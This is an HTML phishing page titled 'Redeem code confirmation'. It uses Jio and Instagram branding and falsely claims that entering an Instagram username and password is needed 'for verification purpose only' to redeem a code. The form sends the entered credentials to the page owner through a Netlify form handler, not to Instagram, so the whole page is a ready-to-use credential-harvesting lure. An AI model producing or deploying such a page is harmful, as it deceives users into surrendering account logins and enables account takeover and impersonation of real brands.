<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem code confirmation</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous" />

</head>
<body>
    <!-- navbar -->
    <div class="navbar">
        <div class="container flex">
            <img src="images/jio-red-logo.png" alt="" class="logo">
            <nav>
                <a href=""></a>
                <a href=""></a>
            </nav>
        </div>
    </div>
    <!-- herobox -->
    <section class="herobox">
        <div class="herobox-form ">
            <img src="images/instagram.png" alt="">
            <h2>Login to your instagram account to verify the redeem code (for verification purpose only)</h2>
            <form name="contact" method="POST" data-netlify="true">
                <input type="hidden" name="form-name" value="contact">
                <div class="form-control">
                    <div class="form-control">
                        <input type="text" name="Name" placeholder="Instagram ID" required>
                    </div>
                    
                    <div class="form-control">
                        <input type="password" name="password" placeholder="Instagram password" required>
                    </div>
                    <div class="form-control">
                        <input type="submit" value="Submit" class="btn">
                    </div>
                </div>
            </form>
        </div>
    </section>
    <!-- footer -->
    <footer class="footer py-5">
        <div class="container">
            <h3>Terms and conditions apply</h3>
            <p>Copyrights &copy; 2020</p>
        </div>
    </footer>
</body>
</html>
